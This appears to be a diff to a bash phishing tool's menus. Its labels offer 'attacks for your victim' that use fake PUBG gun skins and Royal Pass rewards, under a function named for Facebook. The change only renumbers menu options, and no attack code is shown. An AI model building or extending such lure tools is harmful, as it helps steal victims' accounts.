@@ -297,7 +297,7 @@ lovehacker_facebook() {
 
 ${RED}[${WHITE}01${RED}]${ORANGE} link Editor M416		
 ${RED}[${WHITE}02${RED}]${ORANGE} link Editor RoyalPass 17		
-${RED}[${WHITE}02${RED}]${ORANGE} Testing		
+${RED}[${WHITE}03${RED}]${ORANGE} Testing		
 	EOF
 
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
@@ -327,7 +327,7 @@ main_menu() {
 ${MAGENTA} Select An Attack For Your Victim
 ${RED}[${WHITE}01${RED}] Pubg Gun Skin M416
 ${RED}[${WHITE}02${RED}] Pubg Royal Pass 17
-${RED}[${WHITE}02${RED}] BlackMafia Testing New Project
+${RED}[${WHITE}03${RED}] BlackMafia Testing New Project
 ${RED}[${WHITE}99${RED}]${ORANGE} About
 ${RED}[${WHITE}00${RED}]${ORANGE} Exit
 
